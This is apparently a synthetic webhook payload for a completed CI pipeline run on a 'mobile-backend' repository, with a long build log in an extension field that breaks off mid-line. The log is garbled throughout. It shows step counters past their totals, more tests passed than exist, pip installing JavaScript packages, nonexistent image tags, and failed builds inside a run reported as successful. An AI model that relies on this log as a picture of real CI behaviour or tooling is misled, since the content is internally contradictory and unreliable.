{
  "action": "completed",
  "workflow_run": {
    "id": 106,
    "name": "CI Pipeline",
    "head_branch": "main",
    "head_sha": "5792076aafda5ab780ba83171bffede26bb14c23",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-11-25T12:17:54.976977Z",
    "updated_at": "2025-11-25T12:21:29.230408Z"
  },
  "repository": {
    "full_name": "startup-io/mobile-backend",
    "name": "mobile-backend"
  },
  "sender": {
    "login": "alice"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: deploy_staging ===\nFinished.\n\u2713 package completed\nFAILED: test_api_health\nConnection established\nHEAD is now at 8aba124\nUsing Node.js 16.18.7\nStep 20/16: Running migrations\nWARNING: lodash has known vulnerabilities\nCompleted.\nCache restored successfully (26MB)\nSuccess!\nPlatform: darwin-arm64\n[12:17:54] INFO: Connecting to database\nLoading...\nCompleted.\n[12:17:54] WARN: Deprecated API usage\nConnection established\nStep 4/17: Building\nNODE_ENV=production\n[12:17:54] INFO: Request completed\n[12:17:54] DEBUG: Connection pool: 7 active\nMinifying vendor.js\n\u2713 Task completed in 390ms\nTLS handshake completed\nException: NullPointerException\nSuccess!\nArtifact downloaded: 10MB\nCompiling utils/main.py...\nBuilding Docker image...\nWARNING: lodash has known vulnerabilities\nTLS handshake completed\nCreating production build...\n[12:17:54] DEBUG: Query executed in 35ms\nConnection established\n[12:17:54] DEBUG: Initializing service\nStep 15/16: Installing dependencies\npip: Collecting axios\npip: Installing build dependencies...\n[12:17:54] WARN: Deprecated API usage\nWaiting...\n[12:17:54] DEBUG: Query executed in 3ms\nTests: 142 passed, 188 total\nCache restored successfully (483MB)\nStep 1/25: Installing dependencies\nGenerating source maps...\nnpm install: resolved 843 packages\nOptimizing 65 modules...\n\u2713 deploy completed\n[12:17:54] INFO: Request completed\nOptimizing 95 modules...\nStep 17/19: Running migrations\nnpm install: resolved 304 packages\nStep 14/23: Running migrations\nConnecting to test.io:443...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nnpm install: added 217 packages\nyarn add: Done in 21.19s\n[12:17:54] WARN: Deprecated API usage\n  PASS: test_db_connect (394ms)\n\u2713 Step 'build' succeeded\nUploading artifact 'coverage' (27 files)\nStep 13/18: Building\nCompiling utils/utils.go...\nTransforming 987 files...\nWARNING: prettier has known vulnerabilities\nCompiling lib/utils.go...\n[12:17:54] DEBUG: Connection pool: 6 active\nConnecting to startup.dev:443...\npip: Collecting lodash\n[12:17:54] DEBUG: Initializing service\nPulling image: alpine:3.11\npip install: Successfully installed express-3.0\nUsing Python 3.11\nCompiling utils/app.ts...\nCompiling utils/app.ts...\nDone.\nUsing Node.js 17.5.10\nCache saved successfully\n\u2717 build failed with exit code 122\nnpm install: added 203 packages\nStep 12/16: Running migrations\n\u2713 validate completed\nBuilding Docker image...\n\u2713 Task completed in 267ms\n  PASS: test_api_health (452ms)\nHEAD is now at c068f79\n\u2713 Step 'build' succeeded\nPushing to registry...\nStep 4/17: Linting\nTLS handshake completed\nnpm notice: created a lockfile\nTime: 76.25s\nCompleted.\nStep 10/23: Installing dependencies\nBundling main.js\nImage pulled successfully\nCompiling lib/utils.go...\nnpm notice: created a lockfile\nException: RuntimeError\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:17:54] DEBUG: Initializing service\nGenerating source maps...\nBundling vendor.css\n\u2713 test completed\nPulling image: python:latest\n\u2713 All checks passed\n  PASS: unit/test_db_connect.spec.js\nCompiling lib/service.java...\nInstalling webpack@4.5.9\nWARNING: webpack has known vulnerabilities\nCompiling lib/service.java...\nOK\nRan 167 tests in 6s\nAlready up to date.\nException: RuntimeError\nLoading...\nnpm notice: package.json updated\n[12:17:54] DEBUG: Query executed in 6ms\nArtifact uploaded: dist.zip (51MB)\nSuccess!\nWaiting...\nnpm install: added 175 packages\nnpm install: added 37 packages\nnpm install: added 34 packages\n  PASS: test_auth_login (405ms)\nTests: 53 passed, 109 total\nFetching submodules...\nStep 12/25: Installing dependencies\npip: Downloading webpack-1.6.tar.gz\npip: Collecting prettier\nChecking out main branch\npip: Collecting lodash\nPlatform: darwin-arm64\nEnvironment: test\npip: Downloading webpack-4.15.tar.gz\nStep 4/19: Testing\nProcessing...\n[12:17:54] WARN: Deprecated API usage\nMinifying main.js\nOK\nStep 12/24: Deploying\nRan 122 tests in 37s\n[12:17:54] INFO: Connecting to database\nSnapshots: 35 passed, 0 total\nStep 3/18: Deploying\nStep 11/16: Testing\nCompleted.\nProcessing...\n  PASS: test_user_create (109ms)\n[12:17:54] DEBUG: Connection pool: 3 active\nConnecting to startup.dev:443...\n[12:17:54] WARN: Deprecated API usage\nSnapshots: 12 passed, 7 total\nnpm notice: created a lockfile\nDone.\nConnecting to acme.corp:443...\nPOST /api - 200 (448ms)\nLoading...\nPushing to registry...\nWaiting...\nFetching submodules...\nImage pulled successfully\nFetching submodules...\n\u2713 All checks passed\nLayer 5/14: ENV command\n\u2713 Task completed in 1162ms\nTest Suites: 9 passed, 19 total\nWaiting...\nChecking out master branch\nArtifact uploaded: dist.zip (73MB)\nLayer 9/11: ENV command\n[12:17:54] DEBUG: Loading configuration\nImage pulled successfully\nCache hit for key-2810\n[12:17:54] ERROR: Connection failed\nCreating production build...\nnpm notice: created a lockfile\nAlready up to date.\nnpm notice: package.json updated\n\u2713 Step 'install' succeeded\nPulling image: python:latest\nnpm install: added 494 packages\nTests: 311 passed, 131 total\nnpm install: added 394 packages\nTLS handshake completed\n  PASS: integration/test_auth_login.spec.js\n\u2713 Step 'test' succeeded\nProcessing...\nSuccess!\n[12:17:54] DEBUG: Connection pool: 7 active\nCompiling utils/main.py...\nCompleted.\nArtifact uploaded: dist.zip (57MB)\n[12:17:54] INFO: Connecting to database\nWaiting...\nOK\n[12:17:54] DEBUG: Connection pool: 16 active\n  PASS: integration/test_api_health.spec.js\nTransforming 623 files...\nCache hit for key-2922\nCache saved successfully\nTests: 260 passed, 249 total\n=== Step deploy_staging completed ===\n=== Step: restore_cache ===\n[12:17:54] DEBUG: Loading configuration\nAlready up to date.\nCompiling src/service.java...\nStep 6/19: Running migrations\nTransforming 742 files...\n\u2717 build failed with exit code 108\nArtifact uploaded: build.tar.gz (36MB)\nLoading...\nCache hit for key-1922\nStep 17/17: Linting\n[12:17:54] INFO: Starting build process\nnpm install: added 326 packages\nCompleted.\nHEAD is now at 75912cb\nCompleted.\nGET /api - 200 (70ms)\n[12:17:54] WARN: Deprecated API usage\nWARNING: prettier has known vulnerabilities\nCache miss for key-9498\nUploading artifact 'coverage' (39 files)\nOptimizing 54 modules...\n\u2713 All checks passed\nWaiting...\nPlatform: win32-x64\nProcessing...\npip: Downloading react-5.10.tar.gz\nFAILED: test_auth_login\nCompiling utils/handler.rs...\nReady.\nTransforming 814 files...\n  PASS: test_user_create (224ms)\n[12:17:54] INFO: Starting build process\nStep 18/17: Installing dependencies\n[12:17:55] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (13MB)\n  PASS: integration/test_auth_login.spec.js\nFetching submodules...\n[12:17:55] INFO: Starting build process\npip install: Successfully installed lodash-2.0\n\u2717 build failed with exit code 21\nCompiling lib/main.py...\nImage pulled successfully\nSwitched to branch 'hotfix/task-592'\nCache saved successfully\n\u2717 build failed with exit code 72\n[12:17:55] INFO: Connecting to database\n  PASS: e2e/test_db_connect.spec.js\nInstalling react@1.0.7\n[12:17:55] WARN: Deprecated API usage\nReady.\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache restored successfully (76MB)\nStep 5/16: Testing\n\u26a0 DEPRECATION: Feature will be removed in v2.0\npip: Collecting webpack\n[12:17:55] INFO: Cache refreshed\nHEAD is now at dfd3716\n[12:17:55] INFO: Processing request\n[12:17:55] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nFetching submodules...\nImage pulled successfully\nCoverage: 70% statements, 94% branches\nnpm install: added 199 packages\nCache hit for key-4489\nReady.\nDone.\nFetching submodules...\nHEAD is now at 730130e\nLoading...\nStep 6/23: Testing\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n  PASS: e2e/test_db_connect.spec.js\nChecking out develop branch\nReady.\nStep 6/17: Linting\nCompiling src/app.ts...\nCache saved successfully\nPulling image: node:18\nLayer 9/10: COPY command\nPulling image: python:18\nCoverage: 71% statements, 92% branches\npip: Collecting prettier\nWARNING: react has known vulnerabilities\nReady.\nSnapshots: 45 passed, 0 total\nMinifying main.js\nCompiling utils/app.ts...\n[12:17:55] DEBUG: Initializing service\n\u2713 build completed\nArtifact uploaded: dist.zip (100MB)\nCache miss for key-8491\nCache invalidated: build\nCache restored successfully (350MB)\nCache saved successfully\nFetching submodules...\n\u2713 Task completed in 3794ms\n[12:17:55] DEBUG: Connection pool: 12 active\nFetching submodules...\nArtifact uploaded: build.tar.gz (36MB)\nProcessing...\nOptimizing 46 modules...\nReady.\nnpm notice: package.json updated\nCache restored successfully (197MB)\nTransforming 544 files...\nCompleted.\nGenerating source maps...\n\u2713 Task completed in 449ms\n\u2713 Task completed in 3395ms\n[12:17:55] DEBUG: Query executed in 29ms\nTime: 38.595s\n[12:17:55] INFO: Connecting to database\nOK\nAlready up to date.\n\u2713 All checks passed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nTransforming 447 files...\nConnection established\nInstalling eslint@4.16.4\n\u2713 package completed\nReady.\n[12:17:55] WARN: Deprecated API usage\nCompiling utils/main.py...\nInstalling webpack@3.10.8\nGenerating source maps...\nyarn add: Done in 2.24s\npip: Downloading react-4.17.tar.gz\n\u2713 Task completed in 4182ms\n[12:17:55] DEBUG: Memory usage: 739MB\nOK\nnpm install: resolved 1748 packages\nTransforming 110 files...\nnpm notice: package.json updated\n[12:17:55] WARN: Deprecated API usage\nGenerating source maps...\nCompiling utils/utils.go...\nCompiling utils/utils.go...\nUsing Python 3.12\n[12:17:55] INFO: Processing request\n[12:17:55] ERROR: Connection failed\nTransforming 120 files...\nProcessing...\nTest Suites: 12 passed, 24 total\n[12:17:55] WARN: Deprecated API usage\n  PASS: test_auth_login (223ms)\nWARNING: lodash has known vulnerabilities\n\u2713 Step 'checkout' succeeded\nRan 157 tests in 17s\nSwitched to branch 'hotfix/task-972'\nSwitched to branch 'bugfix/task-646'\n[12:17:55] DEBUG: Query executed in 92ms\nPushing to registry...\nWaiting...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling utils/handler.rs...\nMinifying vendor.js\nException: TypeError\nCache restored successfully (150MB)\nCompiling components/service.java...\npip: Downloading jest-2.18.tar.gz\n[12:17:55] DEBUG: Initializing service\nWaiting...\nHEAD is now at 24163f7\nChecking out develop branch\n[12:17:55] WARN: Deprecated API usage\nCompleted.\nFetching submodules...\nCache invalidated: node_modules\nCompiling utils/index.js...\nLayer 8/8: ENV command\nPushing to registry...\nInstalling eslint@1.3.8\n[12:17:55] INFO: Connecting to database\nStep 3/22: Running migrations\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact downloaded: 2MB\nnpm install: resolved 1722 packages\nTLS handshake completed\n\u2713 All checks passed\nUploading artifact 'coverage' (29 files)\nPushing to registry...\nArtifact uploaded: build.tar.gz (19MB)\nSuccess!\nCache miss for key-1280\nUsing Node.js 18.20.2\nDone.\nCompiling components/index.js...\n[12:17:55] INFO: Connecting to database\nnpm install: added 247 packages\nGET /health - 200 (12ms)\nImage pulled successfully\nPlatform: linux-x64\nUsing Node.js 17.6.4\nOK\n  PASS: test_user_create (477ms)\nBuilding Docker image...\nCompleted.\nCoverage: 86% statements, 91% branches\nTest Suites: 5 passed, 37 total\nUploading artifact 'coverage' (1 files)\nFetching submodules...\n=== Step restore_cache completed ===\n=== Step: setup_node ===\nDone.\nPOST /upload - 201 (122ms)\nCompiling components/handler.rs...\nTest Suites: 20 passed, 47 total\n\u2713 All checks passed\nTransforming 603 files...\nProcessing...\nLoading...\n\u2713 Task completed in 768ms\nUsing Python 3.10\nHEAD is now at 2c104c1\nGET /health - 201 (26ms)\n[12:17:55] DEBUG: Loading configuration\nReady.\nPushing to registry...\n[12:17:55] WARN: Deprecated API usage\npip: Downloading webpack-2.13.tar.gz\nCompiling utils/utils.go...\n[12:17:55] DEBUG: Connection pool: 4 active\nCompiling components/index.js...\nTests: 270 passed, 476 total\nFAILED: test_api_health\nWARNING: jest has known vulnerabilities\nLayer 8/12: COPY command\npip: Installing build dependencies...\n\u2713 Task completed in 619ms\nArtifact uploaded: dist.zip (2MB)\nWaiting...\nTests: 393 passed, 102 total\n  PASS: test_api_health (341ms)\nCache restored successfully (128MB)\nAlready up to date.\nImage pulled successfully\n\u2713 Step 'install' succeeded\nTest Suites: 47 passed, 9 total\nWARNING: jest has known vulnerabilities\n[12:17:55] DEBUG: Loading configuration\nGET /health - 201 (24ms)\n\u2717 build failed with exit code 15\nnpm install: added 298 packages\nCompiling lib/app.ts...\nLoading...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: unit/test_db_connect.spec.js\nnpm install: added 250 packages\nCoverage: 72% statements, 84% branches\nCoverage: 85% statements, 77% branches\nFinished.\nUsing Node.js 14.3.2\nCache hit for key-3984\nCache miss for key-6755\n[12:17:55] INFO: Starting build process\nCache miss for key-7407\nCompiling lib/app.ts...\n[12:17:55] INFO: Connecting to database\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nSnapshots: 3 passed, 32 total\n[12:17:55] DEBUG: Memory usage: 884MB\nSwitched to branch 'bugfix/task-148'\nyarn add: Done in 30.7s\nEnvironment: development\nTests: 51 passed, 449 total\nWARNING: webpack has known vulnerabilities\nGenerating source maps...\n[12:17:55] DEBUG: Initializing service\nnpm notice: created a lockfile\n[12:17:55] INFO: Processing request\n[12:17:55] WARN: Deprecated API usage\nStep 15/21: Building\nStep 3/22: Testing\nConnecting to test.io:443...\nnpm install: resolved 1808 packages\nOK\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache restored successfully (386MB)\nBundling runtime.js\nOptimizing 90 modules...\nArtifact uploaded: dist.zip (8MB)\nnpm install: resolved 1304 packages\nWARNING: express has known vulnerabilities\n[12:17:55] INFO: Connecting to database\nArtifact downloaded: 12MB\n[12:17:55] INFO: Request completed\nUsing Node.js 18.0.4\n[12:17:55] INFO: Cache refreshed\n[12:17:55] DEBUG: Connection pool: 12 active\nnpm notice: package.json updated\nCompiling utils/utils.go...\n[12:17:55] DEBUG: Memory usage: 1075MB\nOptimizing 71 modules...\n\u2713 All checks passed\nTime: 76.261s\nOptimizing 79 modules...\nyarn add: Done in 11.13s\nStep 7/22: Deploying\nArtifact downloaded: 34MB\nFinished.\n[12:17:55] INFO: Connecting to database\nFetching submodules...\npip: Collecting react\nNODE_ENV=production\n  PASS: test_auth_login (249ms)\nCompiling utils/handler.rs...\nSuccess!\n  PASS: test_db_connect (46ms)\nTLS handshake completed\nLoading...\nTest Suites: 49 passed, 21 total\nRan 174 tests in 14s\nWARNING: axios has known vulnerabilities\nHEAD is now at c12057d\nCache hit for key-1535\nInstalling webpack@1.8.9\npip: Collecting lodash\nVerifying...\nChecking out develop branch\nFetching submodules...\nyarn add: Done in 9.21s\nTransforming 658 files...\nSuccess!\nChecking out master branch\nGenerating source maps...\nUploading artifact 'build' (43 files)\n[12:17:55] INFO: Processing request\nConnection established\nVerifying...\nUploading artifact 'build' (12 files)\nTransforming 729 files...\n\u2713 All checks passed\nTests: 278 passed, 218 total\nCompiling src/index.js...\n[12:17:55] INFO: Request completed\nDone.\nWARNING: axios has known vulnerabilities\n[12:17:55] INFO: Processing request\nnpm notice: package.json updated\nStep 9/25: Deploying\n[12:17:55] INFO: Processing request\nInstalling jest@2.17.3\nProcessing...\nStep 17/23: Linting\nOK\n\u2713 Step 'build' succeeded\n\u2713 All checks passed\nCreating production build...\nArtifact uploaded: dist.zip (18MB)\n[12:17:55] DEBUG: Loading configuration\nArtifact downloaded: 29MB\nCompiling utils/index.js...\n\u2713 Step 'setup' succeeded\nnpm install: resolved 937 packages\n[12:17:55] INFO: Request completed\nReady.\nInstalling eslint@1.6.3\nNODE_ENV=production\nOK\nAlready up to date.\nImage pulled successfully\nyarn add: Done in 1.90s\nTests: 110 passed, 121 total\nReady.\nCache invalidated: node_modules\nMinifying main.js\nTest Suites: 13 passed, 31 total\nConnection established\nnpm notice: package.json updated\n[12:17:55] DEBUG: Memory usage: 2000MB\n  PASS: test_db_connect (310ms)\nStep 9/25: Linting\nUsing Node.js 19.20.7\n[12:17:55] DEBUG: Initializing service\nDone.\nWaiting...\nUsing Node.js 14.12.0\nCompiling src/app.ts...\nUsing Node.js 18.20.9\nyarn add: Done in 29.84s\nnpm notice: created a lockfile\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nPlatform: win32-x64\nStep 11/20: Installing dependencies\nStep 16/17: Testing\nPlatform: win32-x64\n[12:17:55] WARN: Deprecated API usage\nGET /api - 201 (30ms)\nStep 1/19: Testing\nConnection established\n\u26a0 DEPRECATION: Feature will be removed in v3.0\npip: Installing build dependencies...\n[12:17:55] ERROR: Connection failed\nAlready up to date.\nOK\nCache restored successfully (313MB)\nTest Suites: 23 passed, 49 total\nTest Suites: 34 passed, 47 total\nStep 10/17: Installing dependencies\n\u2717 build failed with exit code 17\nCompiling src/main.py...\nCache saved successfully\nException: TypeError\nCoverage: 75% statements, 65% branches\nArtifact uploaded: dist.zip (30MB)\n=== Step setup_node completed ===\n=== Step: deploy_production ===\nOK\nEnvironment: test\nUsing Python 3.9\nMinifying vendor.js\n  PASS: unit/test_user_create.spec.js\n[12:17:55] DEBUG: Connection pool: 19 active\nFinished.\nLayer 7/13: COPY command\n[12:17:55] DEBUG: Memory usage: 1815MB\nnpm install: resolved 1217 packages\nConnecting to example.com:443...\nProcessing...\nStep 12/25: Testing\nPOST /data - 201 (186ms)\nFAILED: test_cache_hit\npip: Collecting lodash\n[12:17:55] DEBUG: Query executed in 50ms\nCompiling src/index.js...\nStep 1/16: Running migrations\nReady.\nPOST /api - 201 (310ms)\n  PASS: unit/test_db_connect.spec.js\nNODE_ENV=production\nBundling runtime.css\nImage pulled successfully\nEnvironment: production\n  PASS: unit/test_api_health.spec.js\nImage pulled successfully\npip: Downloading express-5.6.tar.gz\nRan 52 tests in 43s\nStep 15/19: Testing\nHEAD is now at d7a7358\n[12:17:55] WARN: Deprecated API usage\nnpm install: added 329 packages\n[12:17:55] INFO: Cache refreshed\nTime: 90.452s\nDone.\n[12:17:55] INFO: Starting build process\nOK\n[12:17:55] INFO: Processing request\n[12:17:55] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (23MB)\nTLS handshake completed\nWaiting...\nnpm notice: package.json updated\n  PASS: integration/test_cache_hit.spec.js\n\u2713 Step 'test' succeeded\n  PASS: unit/test_api_health.spec.js\nCompiling utils/handler.rs...\nLayer 2/10: COPY command\nTransforming 341 files...\nCache miss for key-5286\nMinifying vendor.js\n[12:17:55] DEBUG: Connection pool: 1 active\nCompiling lib/index.js...\nCache hit for key-4754\nSwitched to branch 'feature/task-472'\nCompleted.\nTLS handshake completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: dist.zip (17MB)\nnpm notice: created a lockfile\nWARNING: jest has known vulnerabilities\nTLS handshake completed\nTransforming 362 files...\nCache saved successfully\nCompleted.\nTransforming 954 files...\nInstalling react@1.10.2\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nBuilding Docker image...\nConnecting to test.io:443...\n\u2717 build failed with exit code 23\nStep 2/18: Installing dependencies\nnpm install: resolved 1181 packages\nBuilding Docker image...\nGET /api - 204 (67ms)\n  PASS: test_user_create (330ms)\nConnection established\n[12:17:55] DEBUG: Connection pool: 7 active\nFAILED: test_user_create\nDone.\n[12:17:55] INFO: Cache refreshed\nCompiling utils/service.java...\nSnapshots: 4 passed, 15 total\nGET /health - 201 (58ms)\nUploading artifact 'build' (47 files)\n[12:17:55] INFO: Connecting to database\nStep 1/16: Installing dependencies\nBundling runtime.css\nWARNING: eslint has known vulnerabilities\nSuccess!\nPulling image: alpine:latest\nWARNING: lodash has known vulnerabilities\nTransforming 267 files...\n\u2713 Task completed in 3188ms\nCache miss for key-3312\nyarn add: Done in 27.84s\nPulling image: node:latest\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nyarn add: Done in 3.10s\nPlatform: win32-x64\nArtifact downloaded: 7MB\n[12:17:55] DEBUG: Connection pool: 10 active\nGenerating source maps...\nCompiling lib/service.java...\nHEAD is now at 25366fe\nStep 6/21: Deploying\n\u2713 Step 'setup' succeeded\nUploading artifact 'dist' (26 files)\n[12:17:55] INFO: Connecting to database\nStep 12/16: Linting\nCache miss for key-9145\nCache invalidated: build\nUsing Python 3.10\n[12:17:55] INFO: Connecting to database\n\u2713 package completed\nCompleted.\n[12:17:55] DEBUG: Initializing service\n[12:17:55] DEBUG: Connection pool: 3 active\nBundling runtime.css\n[12:17:55] DEBUG: Initializing service\nStep 8/25: Building\nWaiting...\nStep 13/23: Installing dependencies\nImage pulled successfully\nCompleted.\nRan 169 tests in 58s\nConnecting to test.io:443...\nSuccess!\n\u2713 All checks passed\nConnection established\nImage pulled successfully\nNODE_ENV=production\nTransforming 438 files...\n\u2713 package completed\n\u2713 All checks passed\nStep 19/22: Deploying\nCache restored successfully (230MB)\n  PASS: e2e/test_db_connect.spec.js\nMinifying app.js\nException: ValueError\nChecking out main branch\nLoading...\n[12:17:55] WARN: Deprecated API usage\nUploading artifact 'build' (36 files)\nTest Suites: 39 passed, 50 total\nStep 19/22: Installing dependencies\nWARNING: eslint has known vulnerabilities\nFAILED: test_db_connect\nConnection established\n[12:17:55] DEBUG: Initializing service\nnpm notice: package.json updated\nTest Suites: 36 passed, 7 total\nBuilding Docker image...\nTime: 7.166s\nCache hit for key-9687\npip install: Successfully installed webpack-2.16\n[12:17:55] INFO: Connecting to database\nImage pulled successfully\nnpm install: resolved 313 packages\n[12:17:55] INFO: Connecting to database\nConnection established\nConnecting to test.io:443...\n[12:17:55] INFO: Cache refreshed\nCreating production build...\nPushing to registry...\nSuccess!\n\u2713 Task completed in 4319ms\nPlatform: darwin-arm64\nCompiling lib/handler.rs...\n\u2713 Task completed in 4627ms\nGenerating source maps...\nSnapshots: 15 passed, 8 total\nAlready up to date.\nBuilding Docker image...\n[12:17:55] DEBUG: Memory usage: 1555MB\n[12:17:55] DEBUG: Connection pool: 12 active\nOK\nCache miss for key-2787\nSwitched to branch 'feature/task-553'\nStep 13/18: Running migrations\nEnvironment: staging\nOK\n[12:17:55] WARN: Deprecated API usage\n  PASS: unit/test_api_health.spec.js\nCache invalidated: node_modules\n\u2717 build failed with exit code 13\nSnapshots: 28 passed, 17 total\nProcessing...\n[12:17:55] DEBUG: Connection pool: 16 active\nStep 7/21: Building\nDone.\nVerifying...\nDone.\nPushing to registry...\n  PASS: integration/test_cache_hit.spec.js\nProcessing...\nStep 12/20: Building\nVerifying...\nReady.\nStep 15/25: Testing\n=== Step deploy_production completed ===\n=== Step: install_dependencies ===\nBundling vendor.js\nFinished.\nSnapshots: 22 passed, 10 total\nGET /status - 200 (8ms)\nConnecting to example.com:443...\nConnection established\nFAILED: test_db_connect\nTests: 429 passed, 111 total\nStep 10/18: Deploying\nVerifying...\nLayer 5/14: RUN command\nyarn add: Done in 29.77s\nnpm install: resolved 1515 packages\n[12:17:55] DEBUG: Query executed in 1ms\n[12:17:55] INFO: Processing request\nTransforming 925 files...\nMinifying vendor.js\nOptimizing 64 modules...\nPulling image: node:latest\nChecking out main branch\nWARNING: express has known vulnerabilities\nConnection established\nOptimizing 59 modules...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 18/23: Installing dependencies\nCache miss for key-1731\nArtifact downloaded: 29MB\nFetching submodules...\nArtifact downloaded: 16MB\nInstalling eslint@4.13.10\nCoverage: 84% statements, 90% branches\n\u2713 All checks passed\nCache hit for key-6101\nTLS handshake completed\n[12:17:55] WARN: Deprecated API usage\nCache invalidated: node_modules\nTime: 72.36s\nBuilding Docker image...\nBundling runtime.js\nCreating production build...\nStep 8/21: Running migrations\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nConnection established\nCompiling utils/service.java...\n[12:17:55] WARN: Deprecated API usage\nStep 19/16: Running migrations\n  PASS: test_cache_hit (73ms)\n[12:17:55] INFO: Processing request\nPushing to registry...\npip: Downloading prettier-3.11.tar.gz\nCompiling src/utils.go...\nOK\nCache invalidated: build\nChecking out develop branch\nBuilding Docker image...\n[12:17:55] DEBUG: Memory usage: 1093MB\n[12:17:55] DEBUG: Initializing service\npip: Installing build dependencies...\nTime: 40.230s\nCoverage: 84% statements, 85% branches\nStep 1/24: Running migrations\nSuccess!\nWARNING: jest has known vulnerabilities\nGET /api - 201 (79ms)\nBundling vendor.js\nCoverage: 72% statements, 66% branches\nReady.\nGenerating source maps...\n\u2713 Step 'test' succeeded\nAlready up to date.\nNODE_ENV=development\n[12:17:55] INFO: Request completed\n[12:17:55] INFO: Request completed\nSwitched to branch 'feature/task-165'\nPlatform: linux-x64\nChecking out develop branch\n[12:17:55] INFO: Request completed\n\u2713 Task completed in 416ms\n[12:17:55] WARN: Deprecated API usage\nCoverage: 77% statements, 99% branches\n[12:17:55] DEBUG: Query executed in 69ms\nBuilding Docker image...\n[12:17:55] INFO: Starting build process\nTime: 33.593s\nCache invalidated: build\nRan 187 tests in 50s\nCompleted.\n[12:17:55] DEBUG: Memory usage: 1248MB\n\u2713 build completed\nTLS handshake completed\n\u2713 Task completed in 3253ms\nTLS handshake completed\n\u2717 build failed with exit code 112\nWaiting...\nRan 93 tests in 39s\nCoverage: 71% statements, 71% branches\npip: Installing build dependencies...\n  PASS: e2e/test_auth_login.spec.js\nArtifact uploaded: build.tar.gz (9MB)\nWaiting...\nArtifact downloaded: 49MB\nDone.\nAlready up to date.\n[12:17:55] INFO: Starting build process\nChecking out master branch\nStep 4/23: Building\nStep 4/15: Linting\nGET /health - 201 (37ms)\nnpm install: added 324 packages\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nInstalling express@3.11.6\nEnvironment: development\nCache restored successfully (310MB)\nSnapshots: 24 passed, 34 total\nSuccess!\nLoading...\n\u2713 All checks passed\nTime: 61.487s\nUsing Node.js 16.8.5\nArtifact uploaded: build.tar.gz (20MB)\nSnapshots: 14 passed, 9 total\nUploading artifact 'dist' (30 files)\nCache restored successfully (215MB)\nCache restored successfully (190MB)\nDone.\n[12:17:55] WARN: Deprecated API usage\nVerifying...\nCache hit for key-7864\nSwitched to branch 'hotfix/task-770'\nCreating production build...\nOK\nFAILED: test_db_connect\nTime: 59.513s\nBundling styles.css\nStep 7/25: Deploying\nPulling image: alpine:latest\n\u2713 All checks passed\nProcessing...\nLayer 9/14: COPY command\nEnvironment: staging\nProcessing...\nArtifact uploaded: dist.zip (51MB)\nPulling image: node:18\nConnecting to test.io:443...\n[12:17:55] WARN: Deprecated API usage\nWaiting...\nGenerating source maps...\nCompiling lib/handler.rs...\nCache saved successfully\nArtifact downloaded: 45MB\nCache hit for key-5335\nMinifying main.js\n[12:17:55] DEBUG: Connection pool: 6 active\nRan 43 tests in 17s\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 All checks passed\n[12:17:55] DEBUG: Query executed in 69ms\nnpm notice: package.json updated\nWARNING: prettier has known vulnerabilities\nStep 7/24: Deploying\n[12:17:55] INFO: Connecting to database\nTLS handshake completed\nPOST /api - 202 (80ms)\n[12:17:55] DEBUG: Initializing service\nTest Suites: 22 passed, 7 total\nCompiling utils/service.java...\nCompleted.\nWARNING: webpack has known vulnerabilities\npip: Collecting axios\nyarn add: Done in 23.78s\n\u2717 build failed with exit code 42\nCompiling components/service.java...\n\u2713 Task completed in 3022ms\n[12:17:55] DEBUG: Initializing service\nUploading artifact 'dist' (31 files)\nCompleted.\npip: Collecting webpack\nFinished.\n\u2713 Task completed in 1927ms\nnpm notice: package.json updated\nLayer 5/10: COPY command\n[12:17:55] DEBUG: Memory usage: 619MB\nnpm install: added 475 packages\nTest Suites: 41 passed, 30 total\nImage pulled successfully\nCache invalidated: node_modules\nConnecting to example.com:443...\nCache restored successfully (412MB)\nArtifact uploaded: dist.zip (20MB)\nHEAD is now at 3f7fa7f\nWARNING: webpack has known vulnerabilities\nStep 5/16: Linting\n[12:17:55] INFO: Request completed\nPlatform: linux-x64\nImage pulled successfully\nCache hit for key-7106\npip: Installing build dependencies...\nyarn add: Done in 24.18s\nPulling image: alpine:18\nnpm install: resolved 1706 packages\nAlready up to date.\n[12:17:55] DEBUG: Connection pool: 14 active\n=== Step install_dependencies completed ===\n=== Step: save_cache ===\nReady.\nStep 11/24: Running migrations\nCoverage: 95% statements, 89% branches\nCompleted.\nStep 11/25: Deploying\nTests: 223 passed, 190 total\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:17:55] WARN: Deprecated API usage\nInstalling express@1.12.5\nLayer 1/8: RUN command\nStep 14/16: Linting\nDone.\nArtifact uploaded: build.tar.gz (16MB)\nNODE_ENV=development\n[12:17:55] WARN: Deprecated API usage\nSwitched to branch 'feature/task-496'\nStep 17/19: Linting\nPlatform: darwin-arm64\nSwitched to branch 'bugfix/task-773'\nnpm notice: created a lockfile\nCache restored successfully (193MB)\nOK\n\u2713 Step 'test' succeeded\nInstalling jest@4.20.2\nnpm notice: package.json updated\nEnvironment: staging\nSuccess!\n[12:17:55] INFO: Processing request\nWARNING: express has known vulnerabilities\nImage pulled successfully\nConnection established\nCompiling src/utils.go...\nStep 17/25: Linting\n  PASS: test_db_connect (5ms)\nTests: 255 passed, 359 total\nTests: 242 passed, 110 total\n[12:17:55] WARN: Deprecated API usage\n[12:17:55] DEBUG: Loading configuration\n[12:17:55] ERROR: Connection failed\nFetching submodules...\nProcessing...\nAlready up to date.\nImage pulled successfully\n\u2717 build 